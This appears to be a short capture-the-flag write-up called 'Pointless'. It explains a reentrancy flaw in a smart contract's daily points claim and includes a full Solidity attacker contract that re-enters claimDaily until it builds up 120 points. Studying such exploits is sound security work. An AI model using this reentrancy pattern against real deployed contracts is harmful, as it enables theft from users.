### 12/4/23
# Pointless
## The other crypto

1. Full disclosure, I barely understand this stuff. The target smart contract is intended to let users increment their points by 10 each day with procces daily points. However, we can manipulate the allowed proccesing function to re-enter the program. The claim points function increments points and then increments time AFTER user allowed checks are complete. If we re-call the claim points function it will work again, since it hasn't incrememnted the date yet. This lets us recursively start a cascade of points. We just then need to check that we have enough points before allowing the claim points funciton to finish by terminating our checker. The code for this is below:

```
pragma solidity ^0.8.20;

interface IDailyClient {
    function processDaily(uint256 newPoints) external;
}

// or just copy over the class
interface IPointless {
    function claimDaily() external;
    function claimStreakReward(bytes32 token) external;

}

contract Demo is IDailyClient {
    IPointless immutable pointless;
    uint256 points;

    constructor(IPointless addr) {
      pointless = addr;
    }

    function processDaily(uint256 newPoints) external {
      // update internal point counter
      //points = newPoints;
      points = newPoints;
      if (points < 120) {
        pointless.claimDaily();
      }
    }

    function foo(bytes32 token) external {
        pointless.claimDaily();

        pointless.claimStreakReward(token);
    }
}
```
